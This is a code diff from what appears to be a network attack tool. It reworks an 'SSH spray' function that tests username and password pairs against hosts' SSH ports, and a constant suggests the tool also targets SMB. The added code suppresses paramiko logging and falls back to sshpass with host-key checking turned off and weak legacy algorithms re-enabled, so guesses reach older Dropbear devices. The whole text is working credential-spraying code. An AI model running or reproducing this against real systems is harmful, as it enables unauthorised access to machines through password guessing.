@@ -44,14 +44,35 @@ SMB_PORT         = 445
 
 # ── SSH spray ─────────────────────────────────────────────────────────────────
 def _try_ssh(ip, user, password, timeout=4):
+    # First try paramiko (handles modern SSH)
     try:
-        import paramiko
+        import paramiko, logging
+        logging.getLogger("paramiko").setLevel(logging.CRITICAL)
         c = paramiko.SSHClient()
         c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         c.connect(ip, port=SSH_PORT, username=user, password=password,
                   timeout=timeout, allow_agent=False, look_for_keys=False)
         c.close()
         return True
+    except Exception:
+        pass
+
+    # Fall back to sshpass for old Dropbear / legacy algorithm servers
+    import shutil
+    if not shutil.which("sshpass"):
+        return False
+    try:
+        r = subprocess.run(
+            ["sshpass", "-p", password,
+             "ssh", "-o", "StrictHostKeyChecking=no",
+             "-o", f"ConnectTimeout={timeout}",
+             "-o", "KexAlgorithms=+diffie-hellman-group1-sha1",
+             "-o", "HostKeyAlgorithms=+ssh-rsa",
+             "-o", "BatchMode=no",
+             f"{user}@{ip}", "exit"],
+            capture_output=True, timeout=timeout + 2
+        )
+        return r.returncode == 0
     except Exception:
         return False
 
